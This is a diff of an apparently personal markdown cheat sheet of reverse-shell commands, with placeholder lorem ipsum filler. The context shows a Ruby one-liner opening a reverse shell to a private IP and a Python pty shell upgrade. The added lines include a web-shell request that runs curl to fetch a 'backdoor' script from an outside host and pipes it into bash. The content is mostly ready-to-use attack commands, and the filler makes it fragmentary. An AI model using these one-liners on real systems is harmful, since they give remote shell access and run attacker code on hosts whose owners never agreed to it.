@@ -25,6 +25,12 @@ ruby -rsocket -e'f=TCPSocket.open("192.168.86.131",8080).to_i;exec sprintf("/bin
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")' 
+-------
+bash
+```
+
+```bash
+localhost/myshellllllllll.php?c=system('curl 10.211.55.2:2333/backdoor | bash');
 ```
 
 
@@ -32,3 +38,4 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ## Section 2
 
 Nulla vitae elit libero, a pharetra augue. Cras justo odio, dapibus ac facilisis in, egestas eget quam. Cras mattis consectetur purus sit amet fermentum. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.
+
